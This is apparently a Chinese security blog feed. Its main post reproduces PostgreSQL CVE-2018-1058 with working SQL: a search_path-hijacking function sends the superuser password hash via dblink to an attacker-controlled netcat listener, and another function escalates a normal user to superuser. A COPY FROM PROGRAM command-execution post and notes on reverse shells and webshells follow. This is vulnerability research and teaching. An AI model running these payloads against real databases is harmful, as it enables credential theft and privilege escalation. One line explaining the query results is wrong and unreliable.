<p>Please visit <a href="https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058%3A_Protect_Your_Search_Path" target="_blank" rel="noopener">A Guide to CVE-2018-1058: Protect Your Search Path</a> for a full explanation of the CVE-2018-1058.</p>
</blockquote>
</li>
<li><p><a href="https://github.com/postgres/postgres/commit/5770172cb0c9df9e6ce27c507b449557e5b45124" target="_blank" rel="noopener">修复记录</a>：修复方法，一大堆客户端将忽略数据库<code>search_path</code>和<code>schema privileges</code>，但是不包括<code>psql</code>and <code>pgbench</code>。</p>
<blockquote>
<p>As special exceptions, the following client applications behave as documented regardless of search_path settings and schema privileges: clusterdb createdb createlang createuser dropdb droplang dropuser ecpg (not programs it generates) initdb oid2name pg_archivecleanup pg_basebackup pg_config pg_controldata pg_ctl pg_dump pg_dumpall pg_isready pg_receivewal pg_recvlogical pg_resetwal pg_restore pg_rewind pg_standby pg_test_fsync pg_test_timing pg_upgrade pg_waldump reindexdb vacuumdb vacuumlo.  Not included are core client programs that run user-specified SQL commands, namely psql and pgbench.  PostgreSQL encourages non-core client applications to do likewise.</p>
</blockquote>
</li>
<li><p>修复的版本：10.3, 9.6.8, 9.5.12, 9.4.17, 9.3.22。</p>
</li>
</ul>
</li>
<li><p>总结：有问题的是客户端，属于设计缺陷。</p>
</li>
</ul>
<a id="more"></a>

<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><ol>
<li>小实验<ul>
<li>新建<code>public.test</code>表，插入内容<code>just test01</code>；</li>
<li>新建<code>schema</code>，名为<code>test</code>；</li>
<li>新建<code>test.test</code>表，插入内容<code>just test02</code></li>
</ul>
</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">evil=&gt; create table public.test as select 'just test01'::text as test;</span><br><span class="line">SELECT 1</span><br><span class="line">evil=&gt; select * from test;</span><br><span class="line">    test     </span><br><span class="line">-------------</span><br><span class="line"> just test01</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">evil=&gt; create schema test;</span><br><span class="line">CREATE SCHEMA</span><br><span class="line">evil=&gt; create table test.test as select 'just test02'::text as test;</span><br><span class="line">SELECT 1</span><br><span class="line">evil=&gt; select * from test;</span><br><span class="line">    test     </span><br><span class="line">-------------</span><br><span class="line"> just test02</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>小实验里为什么两次<code>select</code>的结果不一样？</p>
<ul>
<li><p>7.3 版本开始增加了<a href="https://www.postgresql.org/docs/current/static/ddl-schemas.html" target="_blank" rel="noopener">schemas</a>，用户可以在独立的命名空间创建数据表、函数等。默认的命名空间叫<code>public</code>。我的理解，就是一个大的数据库还可以分成几个小的数据库。比如有一个网站A和B共用一个数据库，A的用户表<code>A.user</code>，B的用户表<code>B.user</code>。</p>
</li>
<li><p>在没有注明<code>schema</code>的情况下，数据库会根据配置 <code>search_path</code>，来选择<code>schema</code>。</p>
</li>
<li><p>默认<code>search_path</code>的配置，<code>$user</code>排在<code>public</code> 前。<code>$user</code>的值可以通过<code>SELECT SESSION_USER;</code>得到。</p>
<blockquote>
<p> The default value for <code>search_path</code> is <code>$user,public</code> where <code>$user</code> refers to the name of the user connected (which can be determined by executing <code>SELECT SESSION_USER;</code>).</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">evil=&gt; SHOW search_path;</span><br><span class="line">   search_path   </span><br><span class="line">-----------------</span><br><span class="line"> "$user", public</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过<code>current_schema();</code>可以查询到当前数据库默认的<code>schema</code>。<code>test</code>用户登录时，在没有名为<code>test</code>的<code>schema</code>，默认的<code>schema</code>为<code>public</code>。当新建了名为<code>test</code>的<code>schema</code>，默认的<code>schema</code>为<code>test</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">evil=&gt; SELECT current_schema();</span><br><span class="line"> current_schema </span><br><span class="line">----------------</span><br><span class="line"> public</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">evil=&gt; create schema test;</span><br><span class="line">CREATE SCHEMA</span><br><span class="line">evil=&gt; SELECT current_schema();</span><br><span class="line"> current_schema </span><br><span class="line">----------------</span><br><span class="line"> test</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure>
</li>
<li><p>因此就可以解释为什么两次<code>select</code>的结果不一样。</p>
<ul>
<li>第一次<code>select * from test;</code>，数据库默认的<code>schema</code>是<code>public</code>，实际上执行的是<code>select * from public.test;</code></li>
<li>第二次<code>select * from test;</code>，数据库默认的<code>schema</code>是<code>test</code>，实际上执行的是<code>select * from public.test;</code></li>
</ul>
</li>
</ul>
</li>
<li><p>总结</p>
<p>根据<code>search_path</code>，创建排在前面的<code>schema</code>，就可以在使用默认<code>schema</code>的情况下，改变所使用的<code>schema</code>。<strong>那会有什么样的危害？</strong></p>
</li>
</ol>
<h2 id="0x03-攻击利用复现一"><a href="#0x03-攻击利用复现一" class="headerlink" title="0x03 攻击利用复现一"></a>0x03 攻击利用复现一</h2><p>操作系统：CentOS 7.6</p>
<p>PostgreSQL ：9.6.7</p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ol>
<li><p>用管理员<code>postgres</code>登录数据库；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# &#x2F;usr&#x2F;local&#x2F;pgsql&#x2F;bin&#x2F;psql -U postgres</span><br><span class="line">psql (9.6.7)</span><br><span class="line">Type &quot;help&quot; for help.</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建普通用户<code>test</code>、创建数据库<code>evil</code>、将<code>evil</code>数据库的权限赋予<code>test</code>用户；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">postgres=# create user test password 'test';</span><br><span class="line">CREATE ROLE</span><br><span class="line">postgres=# create database evil;</span><br><span class="line">CREATE DATABASE</span><br><span class="line">postgres=# grant all privileges on database evil to test;</span><br><span class="line">GRANT</span><br></pre></td></tr></table></figure>
</li>
<li><p>连接<code>evil</code>数据库，开启<code>dblink</code>扩展。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">postgres=# \c evil</span><br><span class="line">You are now connected to database "evil" as user "postgres".</span><br><span class="line">evil=# CREATE EXTENSION dblink;</span><br><span class="line">CREATE EXTENSION</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ol>
<li><p>用普通用户<code>test</code>登录数据库<code>evil</code>；</p>
</li>
<li><p>定义恶意函数<code>array_to_string</code>，该函数会连接攻击机器<code>192.168.187.197</code>的<code>12345</code>端口；</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">evil=&gt; CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$ select dblink_connect((select <span class="string">'hostaddr=192.168.187.197 port=12345 user=postgres password=123456 sslmode=disable dbname='</span>||(SELECT passwd FROM pg_shadow WHERE usename=<span class="string">'postgres'</span>))); SELECT pg_catalog.array_to_string(<span class="variable">$1</span>,<span class="variable">$2</span>);</span><br><span class="line">evil$&gt; $$ LANGUAGE SQL VOLATILE;</span><br><span class="line">CREATE FUNCTION</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击机器<code>192.168.187.197</code>监听<code>12345</code>端口；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fen@kaliForFun:~$ nc -lvv 12345</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行<code>pg_dump</code>备份数据库<code>evil</code>；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-bash-4.2$ /usr/local/pgsql/bin/pg_dump -U postgres -f /tmp/evil.bak evil</span><br><span class="line">pg_dump: [archiver (db)] query failed: ERROR:  could not establish connection</span><br><span class="line">DETAIL:  expected authentication request from server, but received </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CONTEXT:  SQL function "array_to_string" statement 1</span><br><span class="line">pg_dump: [archiver (db)] query was: SELECT proretset, prosrc, probin, pg_catalog.pg_get_function_arguments(oid) AS funcargs, pg_catalog.pg_get_function_identity_arguments(oid) AS funciargs, pg_catalog.pg_get_function_result(oid) AS funcresult, array_to_string(protrftypes, ' ') AS protrftypes, proiswindow, provolatile, proisstrict, prosecdef, proleakproof, proconfig, procost, prorows, proparallel, (SELECT lanname FROM pg_catalog.pg_language WHERE oid = prolang) AS lanname FROM pg_catalog.pg_proc WHERE oid = '16529'::pg_catalog.oid</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击机器接收到数据库机器的连接，得到管理员账号<code>postgres</code>的密码（MD5密文）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fen@kaliForFun:~$ nc -lvv 12345</span><br><span class="line">Ncat: Version 7.80 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::12345</span><br><span class="line">Ncat: Listening on 0.0.0.0:12345</span><br><span class="line">Ncat: Connection from 192.168.187.196.</span><br><span class="line">Ncat: Connection from 192.168.187.196:44728.</span><br><span class="line">Duserpostgresdatabasemd5c21719611bbb98ee1b7901e74a92f024</span><br><span class="line">NCAT DEBUG: Closing fd 5.</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
<li><p>对比，漏洞版本和无漏洞版本的日志</p>
<ul>
<li><p>9.6.7 版本的日志（有漏洞）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">LOG:  statement: SELECT pg_catalog.pg_is_in_recovery()</span><br><span class="line">...</span><br><span class="line">LOG:  statement: SET search_path = public, pg_catalog</span><br><span class="line">LOG:  statement: SELECT a.attname, pg_catalog.format_type(a.atttypid, a.atttypmod) AS atttypdefn, a.attlen, a.attalign, a.attisdropped, CASE WHEN a.attcollation &lt;&gt; at.typcollation THEN a.attcollation ELSE 0 END AS attcollation FROM pg_catalog.pg_type ct JOIN pg_catalog.pg_attribute a ON a.attrelid = ct.typrelid LEFT JOIN pg_catalog.pg_type at ON at.oid = a.atttypid WHERE ct.oid = '16512'::pg_catalog.oid ORDER BY a.attnum </span><br><span class="line">LOG:  statement: SET search_path = public, pg_catalog</span><br><span class="line">LOG:  statement: SELECT proretset, prosrc, probin, pg_catalog.pg_get_function_arguments(oid) AS funcargs, pg_catalog.pg_get_function_identity_arguments(oid) AS funciargs, pg_catalog.pg_get_function_result(oid) AS funcresult, array_to_string(protrftypes, ' ') AS protrftypes, proiswindow, provolatile, proisstrict, prosecdef, proleakproof, proconfig, procost, prorows, proparallel, (SELECT lanname FROM pg_catalog.pg_language WHERE oid = prolang) AS lanname FROM pg_catalog.pg_proc WHERE oid = '16529'::pg_catalog.oid</span><br><span class="line">ERROR:  could not establish connection</span><br><span class="line">DETAIL:  expected authentication request from server, but received </span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">CONTEXT:  SQL function "array_to_string" statement 1</span><br><span class="line">STATEMENT:  SELECT proretset, prosrc, probin, pg_catalog.pg_get_function_arguments(oid) AS funcargs, pg_catalog.pg_get_function_identity_arguments(oid) AS funciargs, pg_catalog.pg_get_function_result(oid) AS funcresult, array_to_string(protrftypes, ' ') AS protrftypes, proiswindow, provolatile, proisstrict, prosecdef, proleakproof, proconfig, procost, prorows, proparallel, (SELECT lanname FROM pg_catalog.pg_language WHERE oid = prolang) AS lanname FROM pg_catalog.pg_proc WHERE oid = '16529'::pg_catalog.oid</span><br><span class="line">LOG:  received fast shutdown request</span><br><span class="line">LOG:  aborting any active transactions</span><br><span class="line">LOG:  autovacuum launcher shutting down</span><br><span class="line">LOG:  shutting down</span><br><span class="line">LOG:  database system is shut down</span><br></pre></td></tr></table></figure>
</li>
<li><p>11.7 版本的日志（无漏洞）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOG:  statement: SELECT pg_catalog.pg_is_in_recovery()</span><br><span class="line">LOG:  statement: SELECT pg_catalog.set_config(&#39;search_path&#39;, &#39;&#39;, false)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>发现差异， 9.6.7 版本设置了<code>search_path</code>的顺序为<code>public, pg_catalog</code>，而11.7 版本设置<code>search_path</code>为空。</p>
</li>
<li><p>查了官方文档发现，当<code>pg_catalog</code>不在<code>search_path</code>的情况下，会先去搜索<code>pg_catalog</code>来确保找到内建的函数等。如果用户想要使用自己定义的函数来替代内建的情况下，需要将<code>pg_catalog</code>放在<code>search_path</code>的末尾。</p>
</li>
</ul>
<blockquote>
<p><a href="https://www.postgresql.org/docs/12/ddl-schemas.html#DDL-SCHEMAS-PATH" target="_blank" rel="noopener">The System Catalog Schema</a></p>
<p>If it is not named explicitly in the path then it is implicitly searched <em>before</em> searching the path’s schemas. This ensures that built-in names will always be findable. However, you can explicitly place <code>pg_catalog</code> at the end of your search path if you prefer to have user-defined names override built-in names.</p>
</blockquote>
<ul>
<li>因此，在 9.6.7 版本，<code>array_to_string</code>没有注明<code>schema</code>，<code>search_path</code>的顺序为<code>public, pg_catalog</code>，就会优先查找<code>public</code>，于是就执行了我们定义的恶意函数。而 11.7 版本，将<code>search_path</code>设置为空，<code>array_to_string</code>没有注明<code>schema</code>，则会优先查找<code>pg_catalog</code>，就执行不了恶意函数。</li>
</ul>
<h2 id="0x04-攻击利用复现二"><a href="#0x04-攻击利用复现二" class="headerlink" title="0x04 攻击利用复现二"></a>0x04 攻击利用复现二</h2><p>操作系统：CentOS 7.6</p>
<p>PostgreSQL ：9.6.17 （是的，我是用的 9.6 的最新版测的。）<code>PostgreSQL 9.6.17 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit</code></p>
<p><strong>注：同样的测试，在11.7 版本也试了，结果一样。<code>PostgreSQL 11.7 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit</code></strong></p>
<h3 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h3><ol>
<li>用管理员<code>postgres</code>登录数据库；</li>
<li>创建普通用户<code>test01</code>、创建数据库<code>evil01</code>、将<code>evil01</code>数据库的权限赋予<code>test01</code>用户；</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# psql96 -U postgres</span><br><span class="line">Password for user postgres: </span><br><span class="line">psql96 (9.6.17)</span><br><span class="line">Type "help" for help.</span><br><span class="line"></span><br><span class="line">postgres=# create user test01 password 'test01';</span><br><span class="line">CREATE ROLE</span><br><span class="line">postgres=# create database evil01;</span><br><span class="line">CREATE DATABASE</span><br><span class="line">postgres=# grant all privileges on database evil01 to test01;</span><br><span class="line">GRANT</span><br><span class="line">postgres=# \q</span><br></pre></td></tr></table></figure>

<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><ol>
<li>用普通用户<code>test01</code>登录数据库<code>evil01</code>；</li>
<li>定义恶意函数 <code>public.upper(varchar)</code>；</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# psql96 -U test01 -d evil01</span><br><span class="line">Password for user test01: </span><br><span class="line">psql96 (9.6.17)</span><br><span class="line">Type "help" for help.</span><br><span class="line"></span><br><span class="line">evil01=&gt; CREATE FUNCTION public.upper(varchar) RETURNS TEXT AS $$</span><br><span class="line"><span class="meta">evil01$</span><span class="bash">&gt;     ALTER ROLE test01 SUPERUSER;</span></span><br><span class="line"><span class="meta">evil01$</span><span class="bash">&gt;     SELECT pg_catalog.upper(<span class="variable">$1</span>);</span></span><br><span class="line"><span class="meta">evil01$</span><span class="bash">&gt; $$ LANGUAGE SQL VOLATILE;</span></span><br><span class="line">CREATE FUNCTION</span><br><span class="line">evil01=&gt; CREATE TABLE public.test01 AS SELECT 'test01test01test01'::varchar AS contents;</span><br><span class="line">SELECT 1</span><br><span class="line">evil01=&gt; \q</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>管理员用户<code>postgres</code>登录，执行恶意函数<code>upper</code>，执行之后，普通用户<code>test01</code>的权限已提升为超级管理员权限。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# psql96 -U postgres</span><br><span class="line">Password for user postgres: </span><br><span class="line">psql96 (9.6.17)</span><br><span class="line">Type "help" for help.</span><br><span class="line"></span><br><span class="line">postgres=# select rolname,rolsuper from pg_roles;</span><br><span class="line">      rolname      | rolsuper </span><br><span class="line">-------------------+----------</span><br><span class="line"> pg_signal_backend | f</span><br><span class="line"> postgres          | t</span><br><span class="line"> test01            | f</span><br><span class="line">(3 rows)</span><br><span class="line"></span><br><span class="line">postgres=# \c evil01</span><br><span class="line">You are now connected to database "evil01" as user "postgres".</span><br><span class="line"></span><br><span class="line">evil01=# select contents from test01;</span><br><span class="line">      contents      </span><br><span class="line">--------------------</span><br><span class="line"> test01test01test01</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">evil01=# select upper(contents) from test01;</span><br><span class="line">       upper        </span><br><span class="line">--------------------</span><br><span class="line"> TEST01TEST01TEST01</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">evil01=# select rolname,rolsuper from pg_roles;</span><br><span class="line">      rolname      | rolsuper </span><br><span class="line">-------------------+----------</span><br><span class="line"> pg_signal_backend | f</span><br><span class="line"> postgres          | t</span><br><span class="line"> test01            | t</span><br><span class="line">(3 rows)</span><br></pre></td></tr></table></figure>

<h2 id="0x05-Q-amp-A"><a href="#0x05-Q-amp-A" class="headerlink" title="0x05 Q&amp;A"></a>0x05 Q&amp;A</h2><ol>
<li><p>如何安装dblink扩展？<a href="https://www.cnblogs.com/kuang17/p/10833458.html" target="_blank" rel="noopener">参考</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 通过 yum 安装对应版本的 contrib</span></span><br><span class="line">yum install postgresql11-contrib</span><br><span class="line"><span class="meta">#</span><span class="bash"> 源码编译安装</span></span><br><span class="line">[root@localhost ~]# cd /opt/postgresql-9.6.7/contrib/dblink</span><br><span class="line">[root@localhost dblink]# make &amp;&amp; make install</span><br><span class="line"><span class="meta">#</span><span class="bash"> 连接需要使用dblink的数据库，开启dblink支持</span></span><br><span class="line">postgres=# CREATE EXTENSION dblink;</span><br><span class="line">CREATE EXTENSION</span><br></pre></td></tr></table></figure>
</li>
<li><p>如何源码安装9.6.7版本的Postgresql? </p>
<blockquote>
<p>9.6版本官方指导：<a href="https://www.postgresql.org/docs/9.6/install-short.html" target="_blank" rel="noopener">https://www.postgresql.org/docs/9.6/install-short.html</a></p>
</blockquote>
<p> 安装依赖：<code>yum install -y readline、readline-devel、zlib-devel</code></p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>Postgresql</tag>
      </tags>
  </entry>
  <entry>
    <title>Postgresql CVE-2019-9193 是安全漏洞吗？</title>
    <url>/zh-CN/cve-2019-9193.html</url>
    <content><![CDATA[<p>今天在搜索 Postgresql 漏洞的时候，看到好几篇都说<code>CVE-2019-9193</code>任意代码执行、命令执行，还有漏洞复现文章。</p>
<p>然而看到一篇文章标题《PostgreSQL否认CVE-2019-9193为安全漏洞》？？？</p>
<p>查了一下CNVD的这个<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-08279" target="_blank" rel="noopener">漏洞</a>的信息，危险级别高，结果参考链接打不开？？？</p>
<h2 id="那到底-CVE-2019-9193-是个什么情况？"><a href="#那到底-CVE-2019-9193-是个什么情况？" class="headerlink" title="那到底 CVE-2019-9193 是个什么情况？"></a>那到底 CVE-2019-9193 是个什么情况？</h2><h3 id="Postgresql原文"><a href="#Postgresql原文" class="headerlink" title="Postgresql原文"></a>Postgresql原文</h3><blockquote>
<p><a href="https://www.postgresql.org/about/news/1935/" target="_blank" rel="noopener">https://www.postgresql.org/about/news/1935/</a></p>
</blockquote>
<p>大概意思就是超级用户和pg_execute_server_program，本来就可以执行命令。</p>
<p>原来CVE里说的 <code>pg_read_server_files</code> and <code>pg_write_server_files</code> 是没有权限执行<code>COPY..PROGRAM</code>。</p>
<p>最后让大家永远不要将超级用户访问权限授予远程或不信任的用户。</p>
<p>注：<code>pg_read_server_files</code> and <code>pg_write_server_files</code>，是<a href="https://www.postgresql.org/docs/11/default-roles.html" target="_blank" rel="noopener">11版本新增的默认角色</a>。</p>
<h3 id="漏洞复现的步骤"><a href="#漏洞复现的步骤" class="headerlink" title="漏洞复现的步骤"></a>漏洞复现的步骤</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#39;id&#39;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>

<p><strong>实际起作用的命令是<code>COPY</code></strong></p>
<h3 id="COPY命令的文档"><a href="#COPY命令的文档" class="headerlink" title="COPY命令的文档"></a><code>COPY</code>命令的<a href="https://www.postgresql.org/docs/11/sql-copy.html" target="_blank" rel="noopener">文档</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COPY table_name [ ( column_name [, ...] ) ]</span><br><span class="line">    FROM &#123; &#39;filename&#39; | PROGRAM &#39;command&#39; | STDIN &#125;</span><br><span class="line">    [ [ WITH ] ( option [, ...] ) ]</span><br><span class="line"></span><br><span class="line">COPY &#123; table_name [ ( column_name [, ...] ) ] | ( query ) &#125;</span><br><span class="line">    TO &#123; &#39;filename&#39; | PROGRAM &#39;command&#39; | STDOUT &#125;</span><br><span class="line">    [ [ WITH ] ( option [, ...] ) ]</span><br></pre></td></tr></table></figure>



<p><code>COPY</code> naming a file or command is only allowed to database superusers or users who are granted one of the default roles <code>pg_read_server_files</code>, <code>pg_write_server_files</code>, or <code>pg_execute_server_program</code>, since it allows reading or writing any file or running a program that the server has privileges to access.</p>
<p>大概意思就是：</p>
<ul>
<li>超级用户可以在服务器上读写文件及执行命令，</li>
<li><code>pg_read_server_files</code>可以读服务器的文件。</li>
<li><code>pg_write_server_files</code>可以向服务器写文件。</li>
<li><code>pg_execute_server_program</code>可以在服务器上执行命令。</li>
</ul>
<h3 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h3><p><code>pg_read_server_files</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">postgres=&gt; copy cmd_exec from program 'id';</span><br><span class="line">ERROR:  must be superuser or a member of the pg_execute_server_program role to COPY to or from an external program</span><br><span class="line">HINT:  Anyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec from '/root/hacker';</span><br><span class="line">ERROR:  could not open file "/root/hacker" for reading: Permission denied</span><br><span class="line">HINT:  COPY FROM instructs the PostgreSQL server process to read a file. You may want a client-side facility such as psql's \copy.</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec from '/tmp/hacker';</span><br><span class="line">COPY 2</span><br></pre></td></tr></table></figure>

<p><code>pg_write_server_files</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">postgres=&gt; copy cmd_exec from program 'id';</span><br><span class="line">ERROR:  must be superuser or a member of the pg_execute_server_program role to COPY to or from an external program</span><br><span class="line">HINT:  Anyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec to '/tmp/hacker';</span><br><span class="line">COPY 2</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec to '/root/hacker';</span><br><span class="line">ERROR:  could not open file "/root/hacker" for writing: Permission denied</span><br><span class="line">HINT:  COPY TO instructs the PostgreSQL server process to write a file. You may want a client-side facility such as psql's \copy.</span><br></pre></td></tr></table></figure>

<p><code>pg_execute_server_program</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">postgres=&gt; copy cmd_exec from program 'id';</span><br><span class="line">COPY 1</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec to '/tmp/hacker';</span><br><span class="line">ERROR:  must be superuser or a member of the pg_write_server_files role to COPY to a file</span><br><span class="line">HINT:  Anyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec from '/tmp/hacker';</span><br><span class="line">ERROR:  must be superuser or a member of the pg_read_server_files role to COPY from a file</span><br><span class="line">HINT:  Anyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec from program 'cat /tmp/hacker';</span><br><span class="line">COPY 4</span><br><span class="line"></span><br><span class="line">postgres=&gt; copy cmd_exec to program 'tee /tmp/hacker';</span><br><span class="line">COPY 8</span><br></pre></td></tr></table></figure>



<ul>
<li><p><code>pg_execute_server_program</code>可以执行命令，但是不能直接读写文件。不过既然能执行命令，就可以间接实现读写文件。</p>
</li>
<li><p><code>pg_write_server_files</code>只可以写文件。</p>
</li>
<li><p><code>pg_read_server_files</code>只可以读文件。</p>
</li>
<li><p>不管是哪一种操作，在服务器上是postgres用户的权限。（以postgres用户运行的程序）</p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>不是狭义上的漏洞。</li>
<li>权限设置有问题的话，的确可以执行代码、读写文件，渗透可用。</li>
<li>服务器上的敏感文件不要随便开放给其他用户读写，遵循最小化权限原则。</li>
</ul>
]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>Postgresql</tag>
      </tags>
  </entry>
  <entry>
    <title>安全开发生命周期（SDL:Security Development Lifecycle)</title>
    <url>/zh-CN/security-development-lifecycle.html</url>
    <content><![CDATA[<ol>
<li>培训<ul>
<li>项目所有相关人员都需要进行安全培训。要让每一个人都对安全有所了解。</li>
<li>更重要是项目相关人员与安全人员能达到共识，好开展后续的工作。</li>
</ul>
</li>
<li>要求（项目经理或产品经理）<ul>
<li>确定安全的要求，也就是确定目标。有目标才好开展工作。</li>
<li>从来没有万无一失的安全，要设计通过的最低标准。</li>
<li>分析哪些部分更重要，更需要关注。</li>
</ul>
</li>
<li>设计（项目经理或产品经理）<ul>
<li>确定好安全需求</li>
<li>减小暴露，越暴露越危险。</li>
<li>攻击可能会来自哪里</li>
</ul>
</li>
<li>实施（编程人员）<ul>
<li>使用安全的函数和方法</li>
<li>使用安全的开发工具</li>
<li>静态分析</li>
</ul>
</li>
<li>验证 （测试人员）<ul>
<li>动态分析：侧重功能、逻辑</li>
<li>模糊测试：侧重异常</li>
</ul>
</li>
<li>发布（项目经理或产品经理）<ul>
<li>做好记录，达到了哪些安全目标，哪些部分还存在风险但影响不大等。</li>
</ul>
</li>
<li>响应<ul>
<li>弄清楚出现漏洞发现问题，能找谁解决。</li>
</ul>
</li>
</ol>
<p><strong>安全从来就不是找茬。预防胜于治疗。</strong></p>
<blockquote>
<p><a href="https://www.cnblogs.com/xiaozi/p/9959726.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/9959726.html</a><br><a href="https://www.microsoft.com/en-us/securityengineering/sdl/" target="_blank" rel="noopener">https://www.microsoft.com/en-us/securityengineering/sdl/</a><br><a href="https://wiki.owasp.org/index.php/OWASP_Secure_Software_Development_Lifecycle_Project" target="_blank" rel="noopener">https://wiki.owasp.org/index.php/OWASP_Secure_Software_Development_Lifecycle_Project</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>未授权漏洞</title>
    <url>/zh-CN/summary-unauthorized-access-vulnerability.html</url>
    <content><![CDATA[<p>漏洞场景</p>
<ul>
<li>Web服务类：页面、API<ul>
<li>Docker（Restful 的 API）、Elasticsearch（API）、CouchDB（Restful 的 API）</li>
</ul>
</li>
<li>非Web服务类：数据库、缓存、远程控制等<ul>
<li>Redis、Memcached、VNC、Rsync</li>
</ul>
</li>
</ul>
<p>检测方法</p>
<ul>
<li>内部检查<ul>
<li>检查配置文件</li>
<li>检查启动命令</li>
</ul>
</li>
<li>外围扫描<ul>
<li>Web服务类：直接访问，根据返回的信息判断</li>
<li>非Web服务类：利用客户端进行连接，根据连接是否成功及敏感命令是否执行成功，判断漏洞是否存在</li>
</ul>
</li>
</ul>
<p>漏洞利用</p>
<ul>
<li>写入Webshell：服务器开放Web服务、并且具有Web目录的写权限</li>
<li>利用Crontab定时任务反弹shell：具有写入定时任务文件的权限</li>
<li>写入SSH公钥免密码登录服务器：开放SSH服务，支持密钥登录，具有写入密钥的权限</li>
</ul>
<p>修复方法</p>
<ul>
<li>配置身份认证：修改默认账户名密码 / 配置访问密码</li>
<li>配置访问控制：只允许特定的IP访问</li>
<li>配置绑定IP：如不需要开放外网，则绑定本地IP</li>
<li>修改默认端口：避免端口扫描</li>
<li>权限控制：非root用户启动，没有操作敏感文件的权限</li>
</ul>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
  </entry>
  <entry>
    <title>修改 Hexo 主题生成中英双站</title>
    <url>/zh-CN/config-multilang-blog.html</url>
    <content><![CDATA[<p>终于把 Blog 发布上 Github，接下来想改成支持中英切换的 Blog。</p>
<ol>
<li>中文内容显示在中文Blog，英文内容显示在英文Blog。</li>
<li>菜单随着选择语言的变化而变化。</li>
<li>分类和标签只统计对应语言的。</li>
</ol>
<a id="more"></a>

<h2 id="设置-Hexo-国际化"><a href="#设置-Hexo-国际化" class="headerlink" title="设置 Hexo 国际化"></a>设置 Hexo 国际化</h2><ol>
<li><p>安装 <code>hexo-generator-i18n</code></p>
